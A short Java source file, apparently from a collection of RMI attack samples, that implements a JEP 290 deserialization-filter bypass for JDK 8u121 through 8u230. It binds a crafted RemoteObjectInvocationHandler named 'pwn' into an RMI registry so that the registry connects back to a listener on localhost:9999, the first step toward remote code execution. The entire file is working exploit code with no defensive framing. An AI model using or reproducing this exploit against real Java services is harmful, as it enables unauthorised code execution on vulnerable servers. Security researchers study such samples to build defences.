package RMI.bypassJEP290.jdk121_230;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class DefineClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("localhost", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
        registry.bind("pwn", handler);
    }
}
